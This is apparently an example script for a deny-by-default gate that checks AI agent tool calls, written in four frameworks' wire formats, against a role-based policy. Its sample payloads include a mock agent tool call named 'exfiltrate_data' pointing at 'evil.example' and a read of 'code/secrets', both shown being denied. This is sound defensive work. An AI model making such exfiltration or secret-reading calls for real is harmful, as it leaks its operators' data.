"""One Typesec ToolGate guarding tool calls from four agent frameworks.

The demo speaks each framework's *wire shape* directly (the JSON the OpenAI,
Anthropic, LangChain, and Pydantic AI SDKs put on the wire for tool calls), so
it needs no provider SDKs and no credentials — only the native bindings:

    uv run maturin develop -m crates/typesec-python/Cargo.toml
    uv run python examples/agent_interop_demo.py

Every framework payload funnels into the same `ToolGate`:

    framework tool calls -> ToolGate.guard_json(subject, payload, dialect)
        -> per-call verdicts + framework-shaped denial messages

The gate is deny-by-default: a tool call whose tool has no declared Typesec
binding is refused even for an admin subject.
"""

from __future__ import annotations

import json
from pathlib import Path

try:
    from typesec_native import ToolGate
except ImportError as exc:  # pragma: no cover
    raise SystemExit(
        "typesec_native is not installed in this environment.\n"
        "Build it first:  uv run maturin develop -m crates/typesec-python/Cargo.toml"
    ) from exc


REPO_ROOT = Path(__file__).resolve().parents[1]
POLICY_PATH = REPO_ROOT / "policies" / "rbac-example.yaml"

# The single source of truth: which tool means which (action, resource).
# `resource_arg` scopes the check to the resource each call actually names.
TOOL_BINDINGS = [
    {"tool": "read_report", "action": "read", "resource": "reports/unspecified",
     "resource_arg": "report"},
    {"tool": "run_inference", "action": "ai:infer", "resource": "models/summarizer-v1"},
    {"tool": "deploy_service", "action": "execute", "resource": "infra/prod"},
]

# --- The same tool calls, as each framework serializes them. -----------------

OPENAI_COMPLETION = {
    "choices": [{"message": {"role": "assistant", "tool_calls": [
        {"id": "call_1", "type": "function",
         "function": {"name": "read_report", "arguments": '{"report": "reports/q1"}'}},
        {"id": "call_2", "type": "function",
         "function": {"name": "deploy_service", "arguments": "{}"}},
    ]}}]
}

ANTHROPIC_MESSAGE = {
    "content": [
        {"type": "text", "text": "I'll run inference on the dataset summary."},
        {"type": "tool_use", "id": "toolu_1", "name": "run_inference", "input": {}},
        {"type": "tool_use", "id": "toolu_2", "name": "exfiltrate_data",
         "input": {"dest": "https://evil.example"}},
    ]
}

LANGCHAIN_TOOL_CALLS = [
    {"name": "read_report", "args": {"report": "code/secrets"}, "id": "lc_1",
     "type": "tool_call"},
]

PYDANTIC_AI_RESPONSE = {
    "parts": [
        {"part_kind": "tool-call", "tool_name": "read_report",
         "args": '{"report": "reports/annual"}', "tool_call_id": "pyd_1"},
    ]
}


def show(title: str, subject: str, payload: object, dialect: str, gate: ToolGate) -> None:
    print(f"\n== {title} — subject {subject!r} ==")
    report = json.loads(gate.guard_json(subject, json.dumps(payload), dialect))
    for entry in report:
        verdict = "ALLOW" if entry["allowed"] else "DENY "
        print(f"  {verdict} {entry['tool_name']}"
              f" (action={entry['action']}, resource={entry['resource']})")
        if entry["reason"]:
            print(f"        reason: {entry['reason']}")
        if entry["denial"]:
            print(f"        feed back to model: {json.dumps(entry['denial'])}")


def main() -> None:
    gate = ToolGate.from_file(str(POLICY_PATH), TOOL_BINDINGS, "rbac")

    # analyst: may read reports/*, may not touch infra.
    show("OpenAI chat completion", "agent:data-pipeline", OPENAI_COMPLETION, "openai", gate)

    # ai_reader: may run inference; the unbound exfiltration tool is refused
    # outright — no binding, no policy lookup, no execution.
    show("Anthropic message", "agent:summarizer", ANTHROPIC_MESSAGE, "anthropic", gate)

    # resource_arg scoping: same tool, but the call names a resource outside
    # the analyst's role, so this exact call is denied.
    show("LangChain AIMessage.tool_calls", "agent:data-pipeline",
         LANGCHAIN_TOOL_CALLS, "langchain", gate)

    show("Pydantic AI model response", "agent:data-pipeline",
         PYDANTIC_AI_RESPONSE, "pydantic-ai", gate)

    # The same gate also answers direct questions, outside any dialect.
    decision = gate.check_tool("agent:deploy-bot", "deploy_service")
    print(f"\ndirect check: {decision!r}")


if __name__ == "__main__":
    main()
